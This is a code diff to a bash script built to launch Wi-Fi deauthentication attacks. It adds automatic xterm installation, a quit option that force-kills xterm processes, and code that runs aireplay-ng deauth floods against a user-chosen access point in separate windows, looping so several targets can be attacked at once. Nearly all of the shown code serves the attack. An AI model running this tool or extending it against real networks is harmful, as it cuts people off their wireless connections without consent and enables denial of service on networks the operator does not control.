@@ -4,6 +4,17 @@
 
 function line { echo "-----------------------------------------------"; }
 
+function install-xt {
+	if [ `which xterm | wc -l` -eq 0 ];then
+	   echo -ne "Installing xterm\t"
+	   apt-get install -y xterm 1>/dev/null 2>/dev/null
+	   if [ $(which xterm | wc -l) -eq 1 ];then
+	      echo -e "[ DONE ]"
+	   else echo -e "[ FAILED ]"; exit 1
+	   fi
+	fi
+}
+
 function install-ac {
 	echo -ne "Installing aircrack-ng\t"
 	apt-get install -y aircrack-ng 1>/dev/null 2>/dev/null
@@ -142,7 +153,12 @@ function mdk3-deauth {
 function aireplay-deauth {
 	# choose BSSID
 	max_opt=`cat $td/dmp3.dat | wc -l`
+	echo -e "Enter q/Q to Exit"
 	while read -p "Enter the target no. (1-$max_opt) : " bss; do
+		if [ "$bss" == "q" -o "$bss" == "Q" ];then
+			killme=$(pidof `which xterm`)
+			if [ -n "$killme" ];then for p in "$killme";do kill -9 $p; done; fi
+			exit 1; fi
 		if [ $bss -gt $max_opt -o $bss -lt 1 ];then echo -e "Invalid input !! Retry"; else break; fi
 	done
 	bssid=$(head -n $bss $td/dmp3.dat | tail -n +$bss | awk '{print $2}')
@@ -162,7 +178,12 @@ function aireplay-deauth {
       fi
 	else
 	   iwconfig $miface channel $ch
-	   aireplay-ng --deauth $count -a $bssid $miface
+	   if [ `which xterm | wc -l` -eq 0 ];then
+		aireplay-ng --deauth $count -a $bssid $miface
+	   else
+	   	xterm -e aireplay-ng --deauth $count -a $bssid $miface &
+	   	aireplay-deauth
+	   fi
    fi
    airmon-stop
 }
@@ -176,8 +197,8 @@ if [ `which mdk3 | wc -l` -eq 0 ];then install-mdk; fi
 if [ `which iwconfig | wc -l` -eq 0 ];then install-wt; fi
 
 # working directory
-td=/tmp/deauth-`date +%d%m%y-%H%M%S`
-mkdir $td
+td="/tmp/deauth/`date +%d%m%y-%H%M%S`"
+mkdir -p $td
 if [ `which resize | wc -l` -eq 1 ];then resize -s 30 84 2>/dev/null 1>/dev/null; fi
 clear
 
